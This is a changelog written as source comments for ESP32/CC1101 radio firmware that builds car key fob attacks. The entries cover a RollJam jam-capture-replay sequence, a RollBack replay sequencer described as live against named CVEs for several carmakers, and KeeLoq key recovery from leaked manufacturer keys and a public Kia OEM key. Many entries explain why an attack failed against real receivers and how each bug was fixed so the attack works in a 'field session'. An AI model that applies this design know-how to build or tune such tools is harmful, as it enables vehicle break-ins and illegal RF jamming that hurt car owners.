//     magnitude. Trimming is the fix; the misleading claim is corrected above.
//
// v3.70 (2026-09-26) — C1 RollJam ported from the dashboard into firmware.
//
//   C1 already existed, but as FOBcatch's JavaScript state machine in html_page.h
//   (fccPhase), polling three HTTP endpoints every 1.5 s. Three problems followed
//   from that placement, and all three are structural now that the machine is in
//   firmware:
//
//     1. The jam was owned by the browser. Closing the tab or losing Wi-Fi
//        mid-sequence left the carrier running with nothing to stop it — the same
//        class of failure as the reset-path jam (research/09 §2.2), one layer up.
//     2. No deadline and no single-shot lockout. The JS re-armed itself on replay,
//        so a duplicate tap could re-fire.
//     3. No check that the two banked "codes" were two different codes — the defect
//        research/10 §2.5 fixed in C2, present here too.
//
//   [C1] rjState machine: IDLE -> JAM1 -> CAP1 -> JAM2 -> CAP2 -> TX1 -> IDLE.
//     · rjArm() is explicit and refuses while a sequence runs; rjStart() consumes
//       the arm, so a second start is refused (single-shot).
//     · RJ_WINDOW_MS (8 s) is a hard auto-abort.
//     · Every exit path stops the jam: normal completion, timeout, either capture
//       failing, and the same-code rejection.
//     · The two captures must decode to different, forward-ordered counters before
//       the replay is allowed, so C1 reuses the C2 rule rather than trusting that
//       two entries are two codes.
//     · The replay transmits the CAPTURED press 1 (rjBuf1), not whatever buffer is
//       current — the JS called /api/replay, which sends rfBuf, so it could transmit
//       the wrong code entirely.
//     · rjTick() runs from loop(), so the jam cannot outlive the firmware's control.
//
//   [PREREQ] captureSignal() takes an optional gapUs. The 350 ms default allows a
//     Toyota preamble-to-data silence to pass; C1 passes RJ_CAP_GAP_US (8 ms) so the
//     capture ends at the frame repeat boundary and one block is ONE code, not
//     several repeats of it (research/10 §3).
//
//   Surfaces: /api/rolljam_arm | _start | _abort | _status | _replay, serial
//   mirrors, all behind the auth gate.
//
//   [NOT DONE] C1 still needs bench validation, and research/04 C1 names the thing
//     to validate: dropping the jam for a capture window also lets the CAR hear that
//     press. This code does the "jam through the press, RX between presses" ordering;
//     whether that ordering works against a real receiver is not something a host
//     test can show. Treat C1 as unshippable until that is measured.
//
//   Test: test_rolljam_exec.py extracts rjArm/rjStart/rjTick/rjCtrOrder verbatim and
//     drives them against mocks, asserting sequence order, jam-stopped on every exit
//     path, same-code refusal, deadline, single-shot, re-armability after success, and
//     that the replay sends press 1. 9/9 mutants caught.
//
// v3.69 (2026-09-26) — C2 refuses a same-code pair (research/10 §2.5).
//
//   [BUG] rbArm required two ENTRIES but not two different CODES.
//     One fob press can append two entries: captureSignal fills CAP_SZ=512 pulses
//     over up to 3 s, and a press emits its frame repeatedly. Measured on
//     KIA V3 N1 RAW.sub — frame repeat unit 158 pulses, 10 frames per counter
//     value — so a 512-pulse capture holds ~3.2 frames of ONE counter. Two entries
//     can therefore be the same code, and RollBack would transmit it twice.
//
//     Consequence: the receiver sees no forward counter step, the resync never
//     happens, and the attack fails SILENTLY. The operator sees "done" and cannot
//     tell an unsupported vehicle from a mis-sequenced tool, which is exactly the
//     failure that wastes a field session.
//
//   [FIX] FbkEntry now carries the counter each capture decoded to (ctr/hasCtr),
//     recorded at the append site from the decode that produced the entry. rbArm
//     requires, in this order:
//       · >=2 entries (unchanged);
//       · fbkCtrOrder() >= 0 — equal counters and backward pairs are refused, with
//         16-bit wrap handled so 0xFFFF -> 0x0000 is accepted as forward;
//       · when no counter decoded, a content-identity fallback: two byte-identical
//         width arrays are certainly the same code and are refused. A necessary
//         condition only, as the comment says.
//     /api/rollback_arm now returns reason (need-2-codes | same-or-backward-code |
//     no-distinct-codes) plus a hint, so a refusal is diagnosable rather than silent.
//
//   [NOT DONE, deliberately] Trimming each stored block to one frame before
//     transmitting. research/10 §2.5 asks for it on the premise that a 512-pulse
//     block "will look to the receiver like three presses". Measurement contradicts
//     that: the ~3 frames in a capture all carry the SAME counter, i.e. they are the
//     repeats a real fob sends for one press. Trimming would remove repeats the
//     encoder itself transmits and make reception worse, not better. The real defect
//     was the same-code pair above, which is fixed. Left as-is pending any
//     measurement showing a capture spanning two counters.
//
//   Tests: test_rollback_samecode.py (new) runs the shipped fbkCtrOrder/fbkHash and
//     the arm-acceptance logic over real counter values including wrap and backward
//     cases; test_rollback_exec.py extended with same-code, backward, and
//     no-counter-identical fixtures, plus a guard that fails if the extraction drops
//     the rejection. All mutation-checked.
//
// v3.68 (2026-09-26) — reset-path jam guard, executable C2 test, honest A2.
//
//   [CRITICAL] Reset-path jam guard (research/09 §2.2, §5.4).
//     A reset (watchdog, brownout, panic, reflash) runs no cleanup path, so a jam
//     active when the CPU died could outlive it. Mechanism: startJam() leaves the
//     CC1101 in TX (STX) and drives GDO0 HIGH; in async TX GDO0 is the TX DATA
//     input, so a held-high input is a continuous carrier.
//
//     The previous ordering did not defend this. GDO0 was taken as INPUT (floating,
//     indeterminate) at setup+~1.6 kB while cc_init — which actually leaves TX —
//     did not run until setup+~5.4 kB, after WiFi.softAP, DNS, BLE, HTTP and NVS
//     work. So an inherited carrier could run through all of that.
//
//     Fix, two parts:
//       · setup() now drives GDO0 LOW as an OUTPUT as its FIRST hardware action,
//         before WiFi/DNS/BLE/HTTP/NVS and before anything that could hang or fail.
//         That puts a definite no-carrier level on the TX data input and needs no
//         SPI. It also clears jamActive and rbReset()s the sequencer, since no state
//         can legitimately be inherited across a reset.
//       · cc_init() does the same, then SRES, then SIDLE (0x36), so it is safe on
//         any path including /api/reinit.
//
//   [§5.1] A2 reporting was overstating the result. The corpus stores the same
//     capture under two names, so "validated=4" counted 2 distinct captures twice,
//     and the corroboration line read as independent confirmation. Now de-duplicated
//     by content hash: the headline shows files AND distinct captures, duplicates are
//     labelled, and corroboration is per distinct capture.
//     Further: the two captures agree on the ONLY bits this decoder verifies (button
//     nibble and serial&0xFF are both identical; the difference is at bit 24, which
//     the 12-bit check never covers), so the harness now reports distinct VERIFIED
//     FIELDS and states plainly when captures are not independent evidence.
//
//   [§5.2] Breadth: a second, independent device now validates. Hyundai_V4_N1.sub in
//     the corpus is a KIA/HYU V4 *Key file* (an already-demodulated 8-byte payload),
//     and it decodes with verified field btn=2, serial&0xFF=0xF1 — different from the
//     RAW captures' 0x06, so it is genuinely separate evidence. The harness now also
//     decodes Key files, recorded as a separate evidence class because they exercise
//     the crypto and field extraction but NOT the PWM path. As a bonus negative
//     control, the V0/V2/V5/V6 Key files all correctly fail to validate.
//
//   [§5.3] Executable C2 state-machine test (test_rollback_exec.py). The previous C2
//     test only grepped the source. This one extracts rbArm/rbStart/rbTick verbatim,
//     compiles them against a mock replayRaw that records every transmission, and
//     asserts what a grep cannot: transmit order, gap honoured, single-shot, jam
//     cleared on every exit path including both TX failures, refuses with <2 codes,
//     returns to idle.
//
//   Tests: test_rollback_exec.py (new), test_a2_reporting.py (new),
//     test_rollback_c2.py extended with the reset-path guard assertions. All
//     mutation-checked; several assertions were too loose at first and were
//     tightened after mutants survived them.
//
// v3.67 (2026-09-26) — RAW export polarity fixed (06 §3.4a) + C2 RollBack.
//
//   [06 §3.4a] Capture polarity was assumed, and the assumption was wrong.
//     rfBuf stores pulse WIDTHS, so the level of each pulse is not in the buffer.
//     Both export sites and replayRaw() hard-asserted that rfBuf[0] is HIGH:
//     the exporters wrote +width at even indices, and replayRaw() began with
//     st=true. A capture whose first retained pulse is LOW was therefore exported
//     AND TRANSMITTED with every level inverted, which no receiver accepts.
//
//     Not hypothetical: KIA V3 N1 RAW.sub (in research/sources/captures/kia) has a
//     55 µs HIGH lead-in that the 75 µs glitch filter folds into the next pulse,
//     leaving rfBuf[0] LOW. The old code inverted that capture on export and on
//     replay. Since V4 Kia frames are confirmed in use, this mattered.
//
//     Fix: rfStartHigh / rfStartHighB track the level of rfBuf[0] (and of rfBufB),
//     set from a real reading in both capture modes — GDO0 reads the pin, RSSI mode
//     reads the carrier state instead of assuming HIGH. rawAppendPulses() writes
//     levels from it, and it is recorded in the file ("# polarity: ...") so a
//     consumer need not infer it. replayRaw() takes startHigh and both fbkBuf and
//     SavedKey carry it. Protocol builders that construct HIGH-first frames keep
//     the default.
//
//   [CRITICAL, found while fixing the above] The toy-band >=150 µs filter DROPPED
//     sub-150 pulses, which corrupts every level after the first drop. Recorded
//     pulses alternate, so removing one inverts the parity of the rest — and
//     dropping is physically wrong anyway: the neighbours of a dropped pulse have
//     the SAME level, so their widths belong together. Measured on KIA V3 N1:
//     the drop form leaves 8170 same-level adjacencies out of 43517 pulses;
//     folding leaves 0. This ran at 315 MHz, so it affected exactly the captures
//     this release is about. Now folds, matching the >=75 µs stage above it.
//
//   [C2] RollBack sequencer. Transmits capture 1, waits a configurable gap, then
//     capture 2, so the receiver re-learns its counter and the code it never heard
//     becomes replayable. Live against CVE-2026-49319 (Suzuki Swift) and
//     CVE-2022-37418/36945 (Honda, Hyundai, Kia, Nissan, Mazda). Built on the
//     existing FOBback capture buffer rather than new capture code.
//     Guard rails, because this transmits:
//       · exactly two codes, code 0 then code 1 — never a loop
//       · explicit arm required; firing CONSUMES the arm, so a duplicate tap
//         cannot re-fire (single-shot)
//       · refuses with fewer than 2 captures
//       · inter-code gap clamped to 40–2000 ms
//       · every exit path stops the jam, including both TX-failure paths — a jam
//         that will not stop is the worst failure mode here
//       · never reachable from a scan or a decode, only from /api/rollback_* or
//         the serial command
//     Surfaces: /api/rollback_arm | _fire | _status, serial rollback_* mirrors,
//     and a risk-labelled card in the FOBback walkthrough.
//
//   Tests: test_raw_polarity.py (new) and test_rollback_c2.py (new), both
//     mutation-checked; test_control_surface_auth.py updated for 54 protected
//     routes, with the two RollBack transmit routes pinned as protected.
//
// v3.66 (2026-09-26) — A2 PASSES: Kia V3/V4 validated on real RF captures.
//   The decoder is now proven against genuine Kia fobs. Two framing bugs had
//   made it decode nothing on real hardware while A1 passed clean.
//
//   [CRITICAL] PWM extractor used pulse PAIRS, not one bit per pulse.
//     The reference adds a bit only in its `if(level)` branch: a HIGH pulse of
//     te_short width is 0 and te_long is 1; LOW pulses contribute nothing. The
//     extractor paired (short,long)->1 / (long,short)->0. On a clean V4 capture
//     the pair model recovers the same serial, which is why it stayed hidden —
//     but it misreads the version and cannot cross the sync at all.
//
//   [CRITICAL] No sync skip; the version comes from the sync pulse's LEVEL.
//     A real frame is [ ~12 short+short pairs ][ SYNC 1000-1500us ][ 68 bits ].
//     Sync HIGH => V4 (no inversion), sync LOW => V3 (whole frame inverted) —
//     the reference's is_v3_sync. The pair reader tried to pair through the sync
//     and died on the first pair, returning 0 bits on every real capture.
//     Fixed: preamble scan, sync skip, one bit per HIGH pulse, *outV3 = !syncHigh.
//     Levels come from index parity; both parities are tried because a dropped
//     narrow pulse shifts parity. Old model reported a V3 fob as V4.
//
//   [FIX] A1 encoded the same misreading and therefore passed against the broken
//     decoder — the third self-consistent test in this project to mask a defect.
//     A1 now builds the true on-air format (preamble, sync with the level set by
//     version, one bit per pulse) via ks_kiaV34BuildPulses.
//
//   Evidence (research/08 section 7, tools under research/sources/):
//     · corpus fetched: 323 captures in research/sources/corpus_automotive_subghz/
//     · the firmware C decoder and the Python mirror agree exactly on real captures
//     · KIA V3 N1 -> V3 sn=0x00C0ED06 ctr=0x0026  (was reported V4 before the fix)
//     · KIA V4 N1 -> V4 sn=0x01C0ED06 ctr=0x0013
//     · each fob: 15 distinct hops, counters stepping by exactly 1
//     · re-encrypt(plaintext) == transmitted hop for 15/15 on both (prediction OK)
//     · full corpus: 323 files, 4 validated, all Kia-named, 0 false positives
//
//   research/sources/a2_kia_v34.py is the A2/A3 runner. It refuses to judge a
//   corpus unless it first reproduces both firmware KAT vectors.
//
// v3.65 (2026-09-26) — F5: Kia V3/V4 decoder with its own parser.
//   F5 is the acceptance test for the repaired KeeLoq pipeline: it is the first
//   protocol the tool can decrypt end-to-end with a public OEM key
//   (the Kia V3/V4 OEM key, cross-confirmed in lib/subghz/protocols/kia_v3_v4.c and
//   the RollJam and protocol-decoder reference copies).
//
//   [F5] KIA-V3 / KIA-V4 decoder. Deliberately NOT routed through ks_parseKL.
//     The HCS parser assumes a 66-bit frame with a 12-bit discriminator at
//     sn[15:4]; Kia V3/V4 is 68 bits with a 28-bit serial, every payload byte
//     bit-reversed, and V3 inverts the whole frame. Routing it through the HCS
//     parser corrupts every field. New: ks_kiaV34Pwm/At (extractor, level-
//     agnostic, scans for the preamble), ks_kiaV34Extract (field extraction,
//     both inversions), ks_kiaV34Match (4-bit button + 8-bit serial LSB — NOT
//     ks_klSnMatch), ks_decodeKiaV34 (tries V4 then V3).
//
//   [FIX] Encryption plaintext layout. The on-air serial framing and the
//     encryption input are different layouts in this protocol:
//       on-air  (serial & 0x0FFFFFFF) | (btn<<28)
//       encrypt (cnt & 0xFFFF) | ((serial & 0x3FF)<<16) | (btn<<28)
//     Only serial[9:0] enters the encrypted word. research/06 §2.6 conflated
//     them; the on-air form loses the top serial bits into bits[43:16] of a
//     32-bit word and overwrites the button nibble, so any serial >= 0x3FF
//     failed validation. Caught by the A1 round-trip at serial 0x0A1B2CE7.
//
//   [A1] Synthetic round-trip, at boot. Builds a frame with the reference
//     encoder logic, PWM-encodes it, decodes it, and requires serial/button/
//     counter back for both interpretations. Plus a known-answer test pinning
//     pt=0x30E704D2 -> enc=0x8686900B, because a round-trip alone is blind to
//     the plaintext layout (both candidate layouts place serial[7:0] at
//     bits[23:16], which is all the 12-bit check reads). Verdict latched as
//     kiaV34SelfTestOK and published as kia_v34_ok.
//
//   [FIX] Extract offset. Extracting from offset 0 only fails on any capture not
//     starting exactly at the preamble. Now scans offsets, returning the first
//     string reaching 68 bits — one decrypt attempt, not one per offset.
//
//   [REPORT] Own confirmation gate (ks_kiaV34Confirm). Sharing the HCS gate would
//     mix 16-bit HCS sn values with 28-bit Kia serials in one array. A single
//     frame is reported unconfirmed; a second distinct press promotes it.
//
//   [NOTE] CRC4 is extracted and displayed but never validated: the reference
//     reads it without checking, the encoder brute-forces it over 16 values, and
//     the polynomial is unpublished. Guessing it would reject valid frames. The
//     12-bit decrypt check is the gate. Measured false-accept rate on random
//     well-formed frames: 1 in 1429 (~2x the 1/4096 single-check figure, because
//     both interpretations are tried).
//
//   [KAT] Two vectors, not one. A single vector with serial[9:8]=0 cannot
//     distinguish the 10-bit mask (serial & 0x3FF) from an 8-bit one, so
//     "serial & 0xFF" would have passed every test. Vector 2 uses
//     serial=0x0A1B2FE7 (serial[9:8]=11) to pin the mask width. Both computed
//     from lib/subghz/protocols/kia_v3_v4.c:243 and verified with the shipped
//     cipher. Note: research/07 §2 and §3.2 contain two errors, documented and
//     NOT applied — §2's vectors are ENCRYPT not DECRYPT (ENC matches 3/3), and
//     §3.2's 0x2E7 is wrong (0x3FF is a 10-bit mask, so serial&0x3FF = 0x0E7).
//     Applying §3.2 would have made the KAT pass a wrong implementation.
//
//   [TOOL] tools/kia_v34_acceptance.py — A2/A3 runner. Drives the shipped
//     decoder (extracted verbatim by brace matching), not a Python mirror.
//     --selftest generates synthetic V3/V4 captures and a tampered negative
//     control, so a "no Kia file found" corpus result cannot be confused with a
//     broken runner. Self-test passes: 4/5 validate, control rejected.
//
//   [NOT DONE] A2 (real Kia capture) — no such capture exists in this workspace
//     and a network fetch was blocked. A3 (84 real captures, 0 false positives)
//     validates the framing gate only: none of those captures contains the
//     400/800us pattern, so the crypto rejection path is untested on real RF.
//     The RAW-export polarity assumption (§3.4a) is also still open. C2 not
//     started, per research/07 §6.
//
// v3.64 (2026-09-26) — KeeLoq framing + match-predicate fix, V1 gate, V2/V3.
//   Two defects in the KeeLoq frame path made every key match wrong. They
//   predate this release and were found while implementing the V1/V2/V3
//   validation tasks, which both rest on the same predicate.
//
//   [CRITICAL] 66-bit frame parsed into a uint64_t — top 2 hop bits lost.
//     ks_parseKL accumulated the whole 66-bit frame into a uint64_t and then
//     shifted right by 34 to extract the 32-bit hop. A uint64_t holds 64 bits,
//     so frame bit 65 was lost on the first shift-in and bit 64 on the second:
//     every hop arrived as (hop & 0x3FFFFFFF). Hops with bit 31 or bit 30 set —
//     3 of every 4 codes — were parsed wrong and could never decrypt.
//     Fix: read each field directly out of the bit string (ks_bitsToU32). A boot
//     self-test (ks_klParseSelfTest) now builds real 66-bit frames and asserts
//     every field round-trips, including 0xC0000001 and 0xFFFFFFFF.
//
//   [CRITICAL] Match predicate compared against a constant zero.
//     The check was (dec & 0xFFFF0000) == (sn & 0xFFFF0000). ks_parseKL packs
//     the serial as (disc<<4)|button, so sn <= 0x0000FFFF and sn&0xFFFF0000 is
//     always 0 — the right-hand side carried no information. The left side is
//     the decrypted button+discriminator, and the parser enforces button!=0, so
//     it is never 0 for a valid frame. The predicate therefore reduced to
//     "dec < 0x10000": false for the true key and true for ~1 key in 65536. It
//     could not identify a fob; it only produced noise.
//     Fix: compare the 12-bit discriminator that exists in both values —
//     (dec>>16)&0xFFF against (sn>>4)&0xFFF (ks_klSnMatch). This matches
//   · The reference decoder checks ((decrypt>>16)&0xFF)==(serial&0xFF).
//     All 10 call sites now use the helper.
//
//   [FIX] Predicted hops carried a zero discriminator.
//     The prediction plaintext used (sn & 0xFFF0000) >> 4, which is always zero
//     for the same reason, so every predicted code had disc=0 and could not be
//     accepted by a real receiver. Now built by ks_klBuildPlain() as
//     (btn<<28)|(disc<<16)|ctr.
//
//   [V1] Two-frame agreement gate.
//     With the predicate corrected it compares 12 bits, so a wrong key matches
//     one frame with probability ~1/4096. The search space is 73 static +
//     1022 derived + user keys ~ 1095 candidates, so ~27% of frames produce a
//     spurious match on some key — and a key-derived hop from a wrong key
//     desynchronises the real fob. ks_klPredict now collects every matching
//     candidate for a frame and reports found=true only when the SAME device key
//     also matched the previous frame from the same serial. A true key matches
//     every frame, so no true positive is lost; a spurious hit must repeat on
//     another press, which is ~(1/4096)^2 per candidate. Duplicate decodes of
//     one press are rejected by hop equality, and a different serial resets the
//     gate. States are now three, not two: found / candidate / none.
//
//   [V2] Derivation self-consistency test.
//     ks_klSelfTest() proves the cipher but said nothing about the 14
//     derivations. There is no published normal-learn vector, so the new
//     ks_klDerivSelfTest() checks the property ks_klPredict actually relies on:
//     for each mode, derive a device key, build pt=(btn<<28)|(disc<<16)|ctr,
//     encrypt it, and require the decrypt to equal pt AND the match predicate to
//     accept it. Modes with published reference implementations (M0 normal,
//     M7 normal-dec, M8 magic-xor-1, M9 magic-ser-1) are required to satisfy the
//     predicate check; all modes must round-trip. Verdict latched as klDerivOK.
//
//   [V3] Mode count pinned. static_assert on N_KL_DERIV_MODES and on
//     MAX_DERIVED_KEYS == 73*14, so a short per-mode initialiser list cannot
//     silently zero-fill a tail and drop a mode out of the search budget.
//     Note: the V3 task was based on a misreading — KL_MODE_LEARN already had
//     all 14 initialisers, so no mode was ever missing.
//
//   All three self-test verdicts (cipher, parser, derivations) are published on
//   /api/status and the serial status command, and a failure greys out the Keys
//   tab. test_keeloq_key_table.py asserts every item above.
//
// v3.63 (2026-09-26) — KeeLoq trust chain: boot self-test + real key table.
//   The KeeLoq cipher is the foundation every key-recovery and next-code
//   prediction result rests on. This release makes that foundation verifiable
//   and stops the built-in table from manufacturing false positives.
//
//   [F2] Boot self-test.  ks_klSelfTest() already checked three published
//     vectors but reported only to the serial log, and a failure left the
//     firmware happily running recovery against a broken cipher.  The verdict
//     is now latched (klSelfTestOK / klSelfTestPass), published on /api/status
//     and the serial status command, and surfaced in the dashboard as a red
//     "KeeLoq FAIL" status chip.  The Keys tab shows a warning banner and the
//     key tester refuses to run while the cipher is failing.  The three
//     vectors were verified against the shipped encrypt/decrypt on the host.
//
//   [F1] Real manufacturer key table.  MFR_KEYS[] held 40 invented entries
//     ("OEM-A"…"Generic-F", "Clone-1111"…"Clone-EEEE", "OEM-lo32only"), none of
//     which was a real key.  Every recovery run searched them first, and a hit
//     was labelled "pattern match" even though nothing had been identified.
//     Replaced with the 73 real keys: the publicly leaked gate/barrier/shutter/
//     alarm corpus (the MFR_KEYS table below) plus the one
//     public OEM automotive KeeLoq key, Kia V3/V4.
//
//     · MfrKey now carries a learning type (enum KLLearn) and a suspect flag.
//       The learning type decides which diversification the key actually uses;
//       the suspect flag marks untyped entries and factory defaults (all-zero,
//       all-ones).
//     · "pattern match" now means what it says.  A hit is reported as confirmed
//       only when the key is real and typed AND the derivation is a published
//       scheme.  Heuristic modes (KL_HEURISTIC) and suspect keys are reported as
//       "unconfirmed" — a lead to verify, not an identification.
//     · The 14 derivations live in one helper, ks_deriveOneMfrKey().  The
//       decoder's search, the recovery analyzer, and /api/mfr_test all call it,
//       so the three cannot drift apart.  The analyzer's duplicate 15-mode macro
//       is gone.  /api/mfr_test now reports the learning type per mode.
//     · N_MFR_KEYS is derived from the table and pinned by a static_assert, so a
//       silent truncation cannot recur (recall the v3.62 uint8_t index bug).
//     · Live KeeLoq comments now cite the real Microchip notes (TB003, AN742,
//       AN661, AN662) instead of the non-existent AN1064 / AN1031 / AN1130B
//       labels, matching CITATIONS_AND_REFERENCES.md.  The AN1064/AN1031
//       strings that remain are inside dated changelog entries, which are a
//       record of what past releases said and are left as written.
//     · test_keeloq_key_table.py checks all of the above, including that every
//       table entry matches the corpus it claims to come from.
//
// v3.62 (2026-07-28) — KeeLoq key-recovery fix + TX/keystore hardening.
//   KeeLoq recovery and the transmit guards are built for the single CC1101 on the SGP Card Mini.
//
//   [CRITICAL] KeeLoq key-recovery counter overflow.
//     ks_deriveMfrKeys() generates N_MFR_KEYS(40) × 14 modes = 560 derived device
//     keys into derived[MAX_DERIVED_KEYS], but its running index / return value was
//     uint8_t.  The write index wrapped at 256 (later modes overwrote earlier slots)
//     and the count returned 560 & 0xFF = 48 — so key_recover only ever searched a
//     garbled 48-key subset instead of all 560.  Manufacturer/device-key recovery
//     was silently crippled (most recoverable fobs reported "not found").
//     Fix: widen nd + the return type + the consumer index in ks_klPredict() to
//     uint16_t so all 560 candidates are generated and searched.
//
//   [HARDENING] Accidental key-wipe guard.  key_clear (serial) and
//     /api/clear_user_keys (HTTP) now require an explicit confirm phrase
//     ({"cmd":"key_clear","confirm":"ERASE"} / ?confirm=ERASE) before erasing all
//     saved manufacturer keys; without it they return confirm-required and no-op.
//
//   [HARDENING] TX brownout guard.  replayRaw() refreshes the fuel gauge and refuses
//     to transmit when a present pack reads below TX_BATT_FLOOR_V (3.30 V), emitting
//     a tx_blocked event.  Gauge-absent (USB/bench power, battPct==0) never blocks TX.
//
//   [HARDENING] Element-time / candidate clamps at ingress.  clampTe() bounds any
//     JSON-supplied te_us to 50–5000 µs (rejects negative/absurd values that cast
//     into malformed or multi-second bit-bang bursts) and replaySeq() clamps nCand
//     to 1–500 to bound the transmit loop.
//
// v3.61 (2026-07-24) — BLE compilation fixes for ESP32 Arduino core 3.x.
//   Root cause: arduino-esp32 3.x (ESP-IDF 5.x) reorganised the Bluedroid SDK headers.
//   In core 2.x the Bluedroid API directory was a standalone -I entry so
//   #include "esp_gap_ble_api.h" resolved directly.  In core 3.x only the SDK root
//   (include/) is on the path; the Bluedroid API lives at the subdirectory
//   bt/host/bluedroid/api/include/api/ — meaning neither the quote form nor the
//   simple angle-bracket form resolves from a sketch.
//
//   Fix 1 — multi-path include chain.  The single __has_include guard is replaced with:
//     #if   __has_include(<esp_gap_ble_api.h>)                        — core 2.x
//     #elif __has_include("esp_gap_ble_api.h")                        — quote fallback
//     #elif __has_include(<bt/host/.../esp_gap_ble_api.h>)            — core 3.x full path
//     #elif __has_include(<host/.../esp_gap_ble_api.h>)               — alt SDK layout
//     #endif
//   The third leg resolves on core 3.x because the SDK include root IS on the path.
//
//   Fix 2 — onAuthenticationComplete removed in core 3.x.
//   In arduino-esp32 3.x the BLE security API was overhauled and
//   BLESecurityCallbacks::onAuthenticationComplete(esp_ble_auth_cmpl_t) was
//   removed from the interface.  Declaring the override causes two errors:
//   "esp_ble_auth_cmpl_t has not been declared" and "marked override but does
//   not override".  The method is now guarded with:
//     #if !defined(ESP_ARDUINO_VERSION_MAJOR) || ESP_ARDUINO_VERSION_MAJOR < 3
//   so it is compiled only for core 2.x where the method still exists.
//   Core 3.x loses the bonding-event callback; pairing still works via the
//   BLE stack, but blePairLastAddr won't be populated from this callback.
//
//   Fix 3 — bond-device API call sites.  esp_ble_get_bond_device_num(),
//   esp_ble_bond_dev_t, and esp_ble_get_bond_device_list() are also absent
//   in core 3.x.  Both /api/ble_pair_status and /api/ble_paired_devices are
//   now gated on the same ESP_ARDUINO_VERSION_MAJOR < 3 check; they degrade
//   gracefully (count=0, empty list) on core 3.x.
//
// v3.60 (2026-07-24) — Subaru V2 decoder rewritten from source-verified protocol.
//   Root cause: prior ks_decodeSubaruV2 was a made-up PPM/scramble decoder that could
//   never match the real signal.  The published 2017 framing is Manchester-encoded OOK at ~987 baud
//   (TE_H≈1013µs) with a 10-byte packet: start byte 0x55, command nibbles at B5/B6
//   (LOCK=1, UNLOCK=2, TRUNK=B, PANIC=A), 20-bit sequential rolling counter in B7-B9,
//   and a nibble-XOR+1 checksum in B9[3:0].  New decoder: sync-gap detection (3000-5500µs
//   LO), Manchester decode from pulse widths (short ≈1013µs, long ≈2026µs merged halves),
//   triple validation (start byte + command match + checksum).  te_sub2 guard updated to
//   cA 750-1300µs, ratio 1.7-2.3.  Counter is purely sequential: ks_estDelta returns
//   delta=1 reliably for these 2005-2010 NA Subaru models.
//
// v3.59 (2026-07-23) — Three new rolling-code decoders.
//   · KIA/HYU V2 — 53-bit Manchester OOK, CRC4, rolling, EU 433.92 MHz.
//   · KIA/HYU V7 — 64-bit Manchester FM, CRC8 poly=0x7F init=0x4C, rolling, 433.92 MHz.
//   · Ford RKE V0 — 80-bit Manchester OOK, 10-bit GF(2) CRC, 315/433.92 MHz.
//
// v3.54 (2026-07-21) — Toyota km=true ratio guard: fast-exit + decoder capped at ratio≤2.5.
//   Root cause: signals at 315 MHz with te_us=573–697 µs and ratio=3.1–5.1 satisfied te_toy
//   (cA≤700 µs) and either (a) hit the km=true too_short fast-exit (cnt<60) before any other
//   decoder could run, or (b) entered ks_decodeToyota, failed, then fell to the Ch-B catch-all
//   which v3.53 already rejects via ratio≤3.0.  Path (a) was the gap: the fast-exit had no ratio
//   guard, so every sub-60-edge capture in the Toyota band with a large ratio was immediately
//   committed as Toyota-Denso "too_short" without checking KeeLoq or other decoders.
//   Fix: add ratio≤2.5 guard to (1) the km=true too_short fast-exit and (2) the km=true
//   ks_decodeToyota call.  Toyota's 1T/2T PWM encoding produces ratio≈1.0–2.2 (equal preamble
//   → ratio≈1.0; preamble+data → ratio≈1.5–2.2; RSSI lag may inflate to ≈2.5 at most).
//   Signals with ratio>2.5 skip both gates, fall through all other decoders, and land on OOK-raw.
//   The km=false bypass (equal-preamble Toyota path) and the Ch-A catch-all are unaffected.
//   Ch-B catch-all ratio≤3.0 (v3.53) remains as a second layer for cnt≥60 large-ratio captures.
//
// v3.53 (2026-07-20) — Toyota Ch-B soft-ID ratio gate tightened (≤5.0 → ≤3.0).
//   Root cause: Ford/GM/other OEM fobs at 315 MHz alias into the Toyota Ch-B sweep step at
//   314.65 MHz.  The CC1101 filter is ~350 kHz off-center; off-frequency distortion collapses
//   long LO pulses, dropping observed ratio from ≈10 (Ford asymmetric-OOK) down to 3.3–4.9.
//   The old ≤5.0 guard passed all of these through to the Toyota "possible" catch-all.
//   Empirical evidence from 57-signal mixed-fob library: every non-Toyota false positive (15
//   signals) had ratio 3.27–4.91; real Toyota preamble-only captures (1.0–2.8) unaffected.
//
// v3.52 (2026-07-20) — ISM-band false-positive cleanup: 3 decoders tightened.
//   CAME-12: all-same-nibble guard (0x333/0x666/0x999/0xCCC/0x111/…) alongside existing
//     0x555/0xAAA reject.  Periodic carrier noise maps to 0xCCC in every 12-bit window.
//   Marantec-D: entropy gate (3–9 ones in 12-bit address) + repeat check (offset 16 must
//     match offset 0).  Minimum bLen raised to 32 at call site.
//   PT2262: all-same-nibble guard for 24-bit code (0xCCCCCC etc.) after existing transition
//     check.  0xCCCCCC has only 52% transitions so it passed the ≤73% filter.
//   Root cause: Nice FLOR gate remote decoded as all three protocols simultaneously.
//
// v3.51 (2026-07-20) — Toyota Ch-B soft-ID ratio guard (ratio ≤ 5.0).
//   Root cause: Ch-B catch-all at 313.8–315.5 MHz claimed ANY signal passing te_toy
//   (cA 150–700 µs) regardless of k-means ratio, producing Toyota-Denso/possible serial=0
//   for Ford, GM, and other 315 MHz fobs.  After 5000 µs clipping Ford pulses cluster as
//   cA≈354 µs / cB≈3463 µs → ratio≈10; real Toyota RSSI-distorted captures stay ≤3.5.
//
// v3.50 (2026-07-20) — Frequency lock now actually pins the background scan.
//   Root cause: setfreq only poked the CC1101 hardware once; scanTick() overrode it within
//   ~50 ms on the next sweep iteration.  WiFi "Lock" mode set capFreqMhz but never called any
//   API to narrow the sweep.  A status poll was leaving the sweep pinned to the last channel.
//   Fix: setfreq also sets sweepMin=f-0.15/sweepMax=f+0.15 and calls swp_save(), so scanTick()
//   stays on the locked channel.  setSweep() calls /api/sweep_range when locking;
//   setCapMode('sweep_all') restores the sweep; clearing the lock sends sweep_range reset=1.
//
// v3.49 (2026-07-20) — Toyota-Denso decoder: phase-alignment + end-of-capture fixes.
//   Two bugs caused "possible" confidence (serial=0) on Lexus LS300 at 314.65 MHz:
//
//   Bug 1 — Phase misalignment.  ks_decodeToyota scans for preamble starting at every buffer
//   index pi.  When pi is odd (a LO pulse position) the preamble is found in LO-pulse slots
//   instead of HI-pulse slots.  After pc pairs j is also odd, so the 40-bit data loop reads
//   LO pulses as HI.  A 3T LO gap between two '0'-bit carrier-OFF periods then hits a HI slot
//   and exceeds both the 1T and 2T windows → ok=false.  Observed: preamble at pi=31 (LO),
//   j=37, decode fails at b=14 on cbuf[65]=841 µs (a legitimate 3.4T LO gap in the wrong
//   phase slot).
//
